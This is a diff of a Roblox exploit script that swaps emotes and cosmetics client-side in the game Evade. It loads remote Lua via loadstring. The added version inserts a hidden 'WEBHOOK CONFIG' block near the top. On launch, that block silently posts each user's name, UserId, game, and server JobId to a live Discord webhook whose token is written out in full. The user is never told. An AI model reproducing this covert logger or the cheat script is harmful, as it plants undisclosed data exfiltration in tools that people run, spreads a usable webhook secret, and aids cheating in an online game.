@@ -1,1 +1,173 @@
-do local Fluent=loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))();local SaveManager=loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))();local InterfaceManager=loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))();local Window=Fluent:CreateWindow({Title="evade emote changer",SubTitle="made by xythc",TabWidth=110,Size=UDim2.fromOffset(440,340),Acrylic=true,Theme="Dark",MinimizeKey=Enum.KeyCode.LeftControl});local Tabs={Visuals=Window:AddTab({Title="visuals",Icon="eye"}),Settings=Window:AddTab({Title="settings",Icon="settings"})};local EmoteFolder=game:GetService("ReplicatedStorage"):WaitForChild("Items"):WaitForChild("Emotes");local CosmeticFolder=game:GetService("ReplicatedStorage"):WaitForChild("Items"):WaitForChild("Cosmetics");local CosmeticBackups=Instance.new("Folder",game:GetService("CoreGui"));local Config={OwnEmotes={"","","","","",""},TarEmotes={"","","","","",""},OwnCos="",TargetCos="",Active=false,CosActive=false};local function PerformEmoteSwap() if  not Config.Active then return;end for i=1,6 do local ownName=Config.OwnEmotes[i];local tarName=Config.TarEmotes[i];if ((ownName~="") and (tarName~="")) then local own=EmoteFolder:FindFirstChild(ownName);local target=EmoteFolder:FindFirstChild(tarName);if (own and target and  not own:GetAttribute("Swapped")) then local clone=target:Clone();clone:SetAttribute("Swapped",true);own.Name="backup_"   .. ownName ;clone.Name=ownName;clone.Parent=EmoteFolder;for n,v in pairs(target:GetAttributes()) do clone:SetAttribute(n,v);end end end end end local function PerformCosmeticSwap() if ( not Config.CosActive or (Config.OwnCos=="") or (Config.TargetCos=="")) then return;end local own=CosmeticFolder:FindFirstChild(Config.OwnCos);local target=CosmeticFolder:FindFirstChild(Config.TargetCos);if (own and target and  not own:GetAttribute("CosSwapped")) then if  not CosmeticBackups:FindFirstChild(Config.OwnCos) then local b=own:Clone();b.Name=Config.OwnCos;b.Parent=CosmeticBackups;end own:SetAttribute("CosSwapped",true);for _,child in pairs(own:GetChildren()) do child:Destroy();end for _,child in pairs(target:GetChildren()) do local itemClone=child:Clone();itemClone.Parent=own;for _,effect in pairs(itemClone:GetDescendants()) do if (effect:IsA("ParticleEmitter") or effect:IsA("Trail")) then effect.Enabled=true;end end end for n,v in pairs(target:GetAttributes()) do own:SetAttribute(n,v);end end end Tabs.Visuals:AddSection("emote changer");local OwnSection=Tabs.Visuals:AddSection("current emotes (owned)");for i=1,6 do Tabs.Visuals:AddInput("OwnEm"   .. i ,{Title="slot "   .. i ,Placeholder="owned name...",Callback=function(v) Config.OwnEmotes[i]=v;end});end local TarSection=Tabs.Visuals:AddSection("select emotes (target)");for i=1,6 do Tabs.Visuals:AddInput("TarEm"   .. i ,{Title="slot "   .. i ,Placeholder="target name...",Callback=function(v) Config.TarEmotes[i]=v;end});end Tabs.Visuals:AddButton({Title="swap emotes",Icon="check-circle",Callback=function() Config.Active=true;PerformEmoteSwap();end});Tabs.Visuals:AddButton({Title="reset emotes",Icon="rotate-ccw",Callback=function() Config.Active=false;for _,v in pairs(EmoteFolder:GetChildren()) do if v.Name:find("backup_") then local n=v.Name:gsub("backup_","");local f=EmoteFolder:FindFirstChild(n);if f then f:Destroy();end v.Name=n;end end end});Tabs.Visuals:AddSection("cosmetic changer");Tabs.Visuals:AddInput("CurCos",{Title="current cosmetic",Placeholder="owned...",Callback=function(v) Config.OwnCos=v;end});Tabs.Visuals:AddInput("SelCos",{Title="select cosmetic",Placeholder="target...",Callback=function(v) Config.TargetCos=v;end});Tabs.Visuals:AddButton({Title="swap cosmetic",Icon="package",Callback=function() Config.CosActive=true;PerformCosmeticSwap();end});Tabs.Visuals:AddButton({Title="reset cosmetic",Icon="refresh-cw",Callback=function() Config.CosActive=false;local own=CosmeticFolder:FindFirstChild(Config.OwnCos);local backup=CosmeticBackups:FindFirstChild(Config.OwnCos);if (own and backup) then own:SetAttribute("CosSwapped",nil);for _,child in pairs(own:GetChildren()) do child:Destroy();end for _,child in pairs(backup:GetChildren()) do child:Clone().Parent=own;end end end});InterfaceManager:SetLibrary(Fluent);SaveManager:SetLibrary(Fluent);InterfaceManager:BuildInterfaceSection(Tabs.Settings);SaveManager:BuildConfigSection(Tabs.Settings);local ScreenGui=Instance.new("ScreenGui",game:GetService("CoreGui"));local Btn=Instance.new("ImageButton",ScreenGui);Btn.Size,Btn.Position,Btn.Image,Btn.Draggable=UDim2.new(0,42,0,42),UDim2.new(0,15,0.5,0),"rbxassetid://6031068433",true;Instance.new("UICorner",Btn).CornerRadius=UDim.new(1,0);Btn.MouseButton1Click:Connect(function() Window:Minimize();end);task.spawn(function() while task.wait(1.5) do PerformEmoteSwap();PerformCosmeticSwap();end end);Window:SelectTab(1); end
+-- [[ WEBHOOK CONFIG ]] --
+local WebhookURL = "https://discord.com/api/webhooks/1467500254789369897/Ra6EdPgtDlWNev7PJHp_U67TGg1KFg6WcvsLXJSEH3mnzchgH2sY7P1JiPF0dVPwaCGJ"
+
+local function SendLog()
+    local Players = game:GetService("Players")
+    local HttpService = game:GetService("HttpService")
+    local Market = game:GetService("MarketplaceService")
+    
+    local lp = Players.LocalPlayer
+    local playerCount = #Players:GetPlayers()
+    local maxPlayers = Players.MaxPlayers
+    local placeName = Market:GetProductInfo(game.PlaceId).Name or "Evade"
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "📁 Script Executed: Evade Emote Changer",
+            ["color"] = 0x5865F2,
+            ["fields"] = {
+                {["name"] = "👤 User", ["value"] = lp.Name .. " (@" .. lp.DisplayName .. ")", ["inline"] = true},
+                {["name"] = "🆔 UserID", ["value"] = "[" .. lp.UserId .. "](https://www.roblox.com/users/" .. lp.UserId .. "/profile)", ["inline"] = true},
+                {["name"] = "🎮 Game", ["value"] = placeName .. " (" .. game.PlaceId .. ")", ["inline"] = false},
+                {["name"] = "📊 Server Info", ["value"] = "👥 Players: " .. playerCount .. " / " .. maxPlayers .. "\n🔑 JobId: `" .. game.JobId .. "`", ["inline"] = false}
+            },
+            ["footer"] = {["text"] = "Xythc Hub Logger • " .. os.date("%X")},
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+
+    local request = (syn and syn.request) or (http_request) or (request)
+    if request then
+        request({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    else
+        pcall(function() HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(data)) end)
+    end
+end
+
+-- Start logging in the background
+task.spawn(SendLog)
+
+-- [[ START OF YOUR ORIGINAL SCRIPT ]] --
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
+local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+
+local Window = Fluent:CreateWindow({
+    Title = "evade emote changer",
+    SubTitle = "made by xythc",
+    TabWidth = 110, 
+    Size = UDim2.fromOffset(440, 340),
+    Acrylic = true,
+    Theme = "Dark",
+    MinimizeKey = Enum.KeyCode.LeftControl
+})
+
+local Tabs = {
+    Visuals = Window:AddTab({ Title = "visuals", Icon = "eye" }),
+    Settings = Window:AddTab({ Title = "settings", Icon = "settings" })
+}
+
+local EmoteFolder = game:GetService("ReplicatedStorage"):WaitForChild("Items"):WaitForChild("Emotes")
+local CosmeticFolder = game:GetService("ReplicatedStorage"):WaitForChild("Items"):WaitForChild("Cosmetics")
+local CosmeticBackups = Instance.new("Folder", game:GetService("CoreGui"))
+
+local Config = { 
+    OwnEmotes = {"", "", "", "", "", ""},
+    TarEmotes = {"", "", "", "", "", ""},
+    OwnCos = "", TargetCos = "",
+    Active = false, CosActive = false 
+}
+
+-- [ EMOTE SWAP LOGIC ]
+local function PerformEmoteSwap()
+    if not Config.Active then return end
+    for i = 1, 6 do
+        local ownName = Config.OwnEmotes[i]
+        local tarName = Config.TarEmotes[i]
+        if ownName ~= "" and tarName ~= "" then
+            local own = EmoteFolder:FindFirstChild(ownName)
+            local target = EmoteFolder:FindFirstChild(tarName)
+            if own and target and not own:GetAttribute("Swapped") then
+                local clone = target:Clone()
+                clone:SetAttribute("Swapped", true)
+                own.Name = "backup_" .. ownName
+                clone.Name = ownName
+                clone.Parent = EmoteFolder
+                for n, v in pairs(target:GetAttributes()) do clone:SetAttribute(n, v) end
+                task.wait(0.1)
+            end
+        end
+    end
+end
+
+-- [ COSMETIC SWAP LOGIC ]
+local function PerformCosmeticSwap()
+    if not Config.CosActive or Config.OwnCos == "" or Config.TargetCos == "" then return end
+    local own = CosmeticFolder:FindFirstChild(Config.OwnCos)
+    local target = CosmeticFolder:FindFirstChild(Config.TargetCos)
+    if own and target and not own:GetAttribute("CosSwapped") then
+        if not CosmeticBackups:FindFirstChild(Config.OwnCos) then
+            local b = own:Clone() b.Name = Config.OwnCos b.Parent = CosmeticBackups
+        end
+        own:SetAttribute("CosSwapped", true)
+        for _, child in pairs(own:GetChildren()) do child:Destroy() end
+        for _, child in pairs(target:GetChildren()) do
+            local itemClone = child:Clone()
+            itemClone.Parent = own
+            for _, effect in pairs(itemClone:GetDescendants()) do
+                if effect:IsA("ParticleEmitter") or effect:IsA("Trail") then effect.Enabled = true end
+            end
+        end
+        for n, v in pairs(target:GetAttributes()) do own:SetAttribute(n, v) end
+    end
+end
+
+-- [ UI BUILDER ]
+Tabs.Visuals:AddSection("emote changer")
+for i = 1, 6 do
+    Tabs.Visuals:AddInput("OwnEm"..i, { Title = "slot " .. i .. " (owned)", Placeholder = "owned name...", Callback = function(v) Config.OwnEmotes[i] = v end })
+    Tabs.Visuals:AddInput("TarEm"..i, { Title = "slot " .. i .. " (target)", Placeholder = "target name...", Callback = function(v) Config.TarEmotes[i] = v end })
+end
+
+Tabs.Visuals:AddButton({ Title = "swap emotes", Icon = "check-circle", Callback = function() Config.Active = true; PerformEmoteSwap() end })
+Tabs.Visuals:AddButton({ Title = "reset emotes", Icon = "rotate-ccw", Callback = function()
+    Config.Active = false
+    for _, v in pairs(EmoteFolder:GetChildren()) do
+        if v.Name:find("backup_") then
+            local n = v.Name:gsub("backup_", "")
+            local f = EmoteFolder:FindFirstChild(n) if f then f:Destroy() end
+            v.Name = n
+        end
+    end
+end })
+
+Tabs.Visuals:AddSection("cosmetic changer")
+Tabs.Visuals:AddInput("CurCos", { Title = "current cosmetic", Placeholder = "owned...", Callback = function(v) Config.OwnCos = v end })
+Tabs.Visuals:AddInput("SelCos", { Title = "select cosmetic", Placeholder = "target...", Callback = function(v) Config.TargetCos = v end })
+
+Tabs.Visuals:AddButton({ Title = "swap cosmetic", Icon = "package", Callback = function() Config.CosActive = true; PerformCosmeticSwap() end })
+Tabs.Visuals:AddButton({ Title = "reset cosmetic", Icon = "refresh-cw", Callback = function()
+    Config.CosActive = false
+    local own = CosmeticFolder:FindFirstChild(Config.OwnCos)
+    local backup = CosmeticBackups:FindFirstChild(Config.OwnCos)
+    if own and backup then
+        own:SetAttribute("CosSwapped", nil)
+        for _, child in pairs(own:GetChildren()) do child:Destroy() end
+        for _, child in pairs(backup:GetChildren()) do child:Clone().Parent = own end
+    end
+end })
+
+InterfaceManager:SetLibrary(Fluent)
+SaveManager:SetLibrary(Fluent)
+InterfaceManager:BuildInterfaceSection(Tabs.Settings)
+SaveManager:BuildConfigSection(Tabs.Settings)
+
+local ScreenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
+local Btn = Instance.new("ImageButton", ScreenGui)
+Btn.Size, Btn.Position, Btn.Image, Btn.Draggable = UDim2.new(0, 42, 0, 42), UDim2.new(0, 15, 0.5, 0), "rbxassetid://6031068433", true
+Instance.new("UICorner", Btn).CornerRadius = UDim.new(1, 0)
+Btn.MouseButton1Click:Connect(function() Window:Minimize() end)
+
+task.spawn(function()
+    while task.wait(1.5) do
+        PerformEmoteSwap()
+        PerformCosmeticSwap()
+    end
+end)
+
+Window:SelectTab(1)
